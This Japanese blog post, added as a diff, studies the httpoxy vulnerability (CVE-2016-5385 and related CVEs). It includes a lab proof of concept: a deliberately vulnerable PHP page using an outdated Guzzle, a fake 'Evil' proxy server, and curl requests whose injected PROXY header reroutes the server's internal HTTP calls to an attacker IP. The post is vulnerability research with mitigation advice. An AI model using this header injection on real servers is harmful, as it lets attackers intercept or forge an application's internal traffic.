@@ -1,0 +1,296 @@
+---
+layout: post
+title:  "httpoxy脆弱性について調査"
+date:   2016-07-19 12:00:00 +0900
+categories: vulnerability
+toc: true
+---
+
+# 概要
+
+CGIはHTTPリクエストで渡されたPROXYヘッダの値をHTTP_PROXY変数として保存しますが、HTTP_PROXY変数はHTTPクライアントにおいてPROXYの設定用に使われる変数であるため、攻撃者はHTTPクライアントに任意のHTTPプロキシを使用させることができます。
+
+# 影響
+
+環境変数が保持されるのはセッション毎なのか、プロセス毎なのかで影響範囲は異なります。ただ、多くのアプリケーションはセッション毎であるはずで、セッション毎ではないのは別の意味で脆弱だと思われるので、ここでは環境変数はセッション毎に保持される前提とします。
+また、2種類の攻撃に分けて考える必要があると思います。
+
+ * 第三者のHTTPリクエストを改竄して任意のPROXYを強制的に設定する
+
+この攻撃については中間者攻撃などのHTTPリクエストを改竄させる攻撃を併用する必要があります。攻撃者の目的がリクエストの改竄や傍受であるならば、中間者攻撃が達成できている時点で目的を達成できる条件は揃っているわけですので、この攻撃が実行される可能性は低いと考えています。
+
+ * 攻撃者自身のHTTPリクエストに任意のPROXYを設定する
+
+このような攻撃が実行される時、攻撃者が焦点を当てているのは、アプリケーション内部の通信を自分の制御下にあるproxyを通すことで内部仕様の把握やアプリケーションに悪意のあるデータを挿入しようとしていると考えられます。しかし、アプリケーション内部で起こる通信がTLS化されている場合、攻撃者が得ることができるのは暗号化された通信のみとなります。もしAPI通信などの通信が平文で行われていた場合、攻撃者はhttpoxyを利用してアプリケーションの仕様を把握し、不正なデータの挿入などを試みる可能性があります。
+
+# 解決策、緩和策
+
+2016/07/19日現在、パッチは出ていないので、PROXYヘッダーを無効する対応を[httpoxyの公式サイト](https://httpoxy.org/#fix-now)では推奨されています。
+
+# CVEの列挙
+
+httpoxyは様々なソフトウェアに影響があるため、複数のCVE番号が関連します。
+
+ * CVE-2016-5385 - PHP
+ * CVE-2016-5386 - Go
+ * CVE-2016-5387 - Apache HTTPD
+ * CVE-2016-1000104 - mod_fcgi
+ * CVE-2016-1000105 - Nginx cgi script
+ * CVE-2016-5388 - Tomcat
+ * CVE-2016-1000107 - Erlang HTTP Server
+ * CVE-2016-1000108 - YAWS
+ * CVE-2016-1000109 - HHVM FastCGI
+ * CVE-2016-1000110 - Python CGIHandler
+ * CVE-2016-1000111 - Python twisted
+
+## CVE-2016-5385についての検証
+
+ * 情報源
+     * [CERT](https://www.kb.cert.org/vuls/byid?query=CVE-2016-5385&searchview=)
+     * [Debian](https://security-tracker.debian.org/tracker/CVE-2016-5385)
+     * [Github](https://github.com/search?q="CVE-2016-5385")
+     * [LWN](https://lwn.net/Search/DoSearch?words=CVE-2016-5385)
+     * [NVD](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-5385)
+     * [PacketStorm](https://packetstormsecurity.com/search/?q=CVE-2016-5385)
+     * [Redhat](https://access.redhat.com/security/cve/CVE-2016-5385)
+     * [Ubuntu](https://people.canonical.com/~ubuntu-security/cve/CVE-2016-5385.html)
+     * [bugtraq](https://marc.info/?s=CVE-2016-5385&l=bugtraq)
+     * [exploitdb](https://www.exploit-db.com/search/?action=search&cve=2016-5385)
+     * [fulldisc](https://marc.info/?s=CVE-2016-5385&l=full-disclosure)
+     * [metasploit](https://www.rapid7.com/db/search?q=CVE-2016-5385)
+     * [oss-sec](https://marc.info/?s=CVE-2016-5385&l=oss-security)
+
+ * 検証環境
+
+```
+$ lsb_release -a
+No LSB modules are available.
+Distributor ID: Debian
+Description:    Debian GNU/Linux 8.5 (jessie)
+Release:        8.5
+Codename:       jessie
+$ dpkg -l | egrep 'apache|php'
+ii  apache2                        2.4.10-10+deb8u4            amd64        Apache HTTP Server
+ii  php5                           5.6.23+dfsg-0+deb8u1        all          server-side, HTML-embedded scripting language (metapackage)
+```
+
+まずはHTTPヘッダーを渡すことでHTTP_PROXY変数を埋めることができるのかどうかを確認します。
+
+ * test.php
+
+```php
+<html>
+<head>
+<title>title httpoxy proof of concept</title>
+<body>
+<?php
+echo getenv('HTTP_PROXY')
+?>
+</body>
+</html>
+```
+
+ * attack
+
+```
+$ curl -H 'PROXY:HTTPOXY VLUN' http://scapegoat.test/test.php
+<html>
+<head>
+<title>title httpoxy proof of concept</title>
+<body>
+HTTPOXY VLUN
+</body>
+</html>
+```
+
+HTTP_PROXY変数に任意の値を格納することに成功しました。これが一体どういう問題を起こすのでしょうか？
+Guzzile4系のようなHTTP_PROXY環境変数を利用するHTTPクライアントを利用すると問題は顕在化します。
+
+ * guzzle4.0.1のインストール
+
+```
+curl -sS https://getcomposer.org/installer | php
+php composer.phar require guzzlehttp/guzzle:~4.0.1
+```
+
+guzzleの最新版は6系です。4系はEOLになっており、脆弱性を発現させるために故意に導入しています。
+次に脆弱なphpファイルを作成します。test.phpは内部でHTTPクライアントを作成して、ok.phpのレスポンスを表示します。
+
+ * test.php
+
+```
+
+<html>
+<head>
+<title>title httpoxy proof of concept</title>
+<body>
+<?php
+if (getenv('HTTP_PROXY') == false) {
+    echo "HTTP_PROXY variable is false";
+}else{
+    echo "HTTP_PROXY variable is ".getenv('HTTP_PROXY');
+}
+require 'vendor/autoload.php';
+$client = new GuzzleHttp\Client();
+$res = $client->get('http://scapegoat.test/ok.php');
+
+echo "OK.php return response is " . $res->getBody();
+?>
+</body>
+</html>
+```
+
+ * ok.php
+
+```
+<?php
+echo "OK";
+?>
+```
+
+攻撃者は悪意のあるproxyサーバを自分のコントロール下で構築します。ここで用意しているのはproxyとは名ばかりの貧弱なHTTPサーバになっています。
+
+ * proxy.py
+
+```python
+#!/usr/bin/python
+import http.server
+import socketserver
+import io
+
+HTTP_PORT = 4000
+
+class httpoxy(http.server.SimpleHTTPRequestHandler):
+
+    def do_GET(self):
+        bytes = "Evil".encode('utf-8')
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write(bytes)
+        return
+
+httpd = socketserver.TCPServer(("", HTTP_PORT), httpoxy)
+httpd.serve_forever()
+```
+
+まずは正常なリクエストを見てみます。
+
+```bash
+$ curl http://scapegoat.test/test.php
+<html>
+<head>
+<title>title httpoxy proof of concept</title>
+<body>
+HTTP_PROXY variable is false
+OK.php return response is OK</body>
+</html>
+```
+
+ok.phpにより**OK**という文字列が表示されています。 次に攻撃者によって悪意あるproxyサーバに強制的に接続され、そのサーバから返答を受け取った例を見てみます。
+
+```bash
+$ curl -H 'PROXY: 192.168.10.103:4000' http://scapegoat.test/test.php
+<html>
+<head>
+<title>title httpoxy proof of concept</title>
+<body>
+HTTP_PROXY variable is 192.168.10.103:4000
+OK.php return response is Evil</body>
+</html>
+```
+
+**OK**と表示されていた箇所に**Evil**と表示されています。この時、答えを返しているのは悪意あるproxyであり、ok.phpにはリクエストが飛ぶことはありません。
+
+# HTTP_PROXY_*変数
+
+[akamai](https://blogs.akamai.com/2016/07/akamai-mitigates-httpoxy-vulnerability.html)ではHTTP_PROXY変数の他の以下の変数が潜在的な影響を受けたと報告しています。
+
+ * HTTP_PROXY_PASS
+ * HTTP_PROXY_USER
+ * HTTP_PROXY_HOST
+ * HTTP_PROXY_PORT
+
+CVE-2016-5385についての検証で利用した検証環境を用いて上記変数への影響があるのかを検証します。
+
+
+```php
+<html>
+<head>
+<title>title httpoxy proof of concept</title>
+<body>
+<?php
+
+// HTTP_PROXY
+if (getenv('HTTP_PROXY') == false) {
+    echo "HTTP_PROXY variable is false";
+}else{
+    echo "HTTP_PROXY variable is ".getenv('HTTP_PROXY');
+}
+
+echo "\n";
+
+// HTTP_PROXY_USER
+if (getenv('HTTP_PROXY_USER') == false) {
+    echo "HTTP_PROXY_USER variable is false";
+}else{
+    echo "HTTP_PROXY_USER variable is ".getenv('HTTP_PROXY_USER');
+}
+
+echo "\n";
+// HTTP_PROXY_PASS
+if (getenv('HTTP_PROXY_PASS') == false) {
+    echo "HTTP_PROXY_PASS variable is false";
+}else{
+    echo "HTTP_PROXY_PASS variable is ".getenv('HTTP_PROXY_PASS');
+}
+
+echo "\n";
+// HTTP_PROXY_HOST
+if (getenv('HTTP_PROXY_HOST') == false) {
+    echo "HTTP_PROXY_HOST variable is false";
+}else{
+    echo "HTTP_PROXY_HOST variable is ".getenv('HTTP_PROXY_HOST');
+}
+
+echo "\n";
+// HTTP_PROXY_PORT
+if (getenv('HTTP_PROXY_PORT') == false) {
+    echo "HTTP_PROXY_PORT variable is false";
+}else{
+    echo "HTTP_PROXY_PORT variable is ".getenv('HTTP_PROXY_PORT');
+}
+
+echo "\n";
+?>
+</body>
+</html>
+```
+
+```
+$ curl -H 'PROXY: VLUN' -H 'PROXY_USER: VLUN' -H 'PROXY_PASS: VLUN' -H 'PROXY_HOST: VLUN' -H 'PROXY_PORT: VLUN'  http://scapegoat.test/test.php
+<html>
+<head>
+<title>title httpoxy proof of concept</title>
+<body>
+HTTP_PROXY variable is VLUN
+HTTP_PROXY_USER variable is false
+HTTP_PROXY_PASS variable is false
+HTTP_PROXY_HOST variable is false
+HTTP_PROXY_PORT variable is false
+</body>
+</html>
+```
+
+上記[検証環境](https://kosukeshimofuji.jp/2016/07/19/httpoxy/#cve-2016-5385についての検証)ではHTTP_PROXY変数以外は汚染することができませんでした。
+
+# まとめ
+
+ * 中間者攻撃と併用して第三者を攻撃するメリットはないように思える。
+ * 内部のAPI通信にHTTPSを使っていれば、攻撃者ができるのは暗号化された通信を溜め込んでおくことぐらいになる。
+
+# 参考文献
+
+ * [httpoxy脆弱性の公式ページ](https://httpoxy.org/)
+ * [osssec](http://seclists.org/oss-sec/2016/q3/95)
+ * [Akamai Mitigates httpoxy Vulnerability](https://blogs.akamai.com/2016/07/akamai-mitigates-httpoxy-vulnerability.html)
+
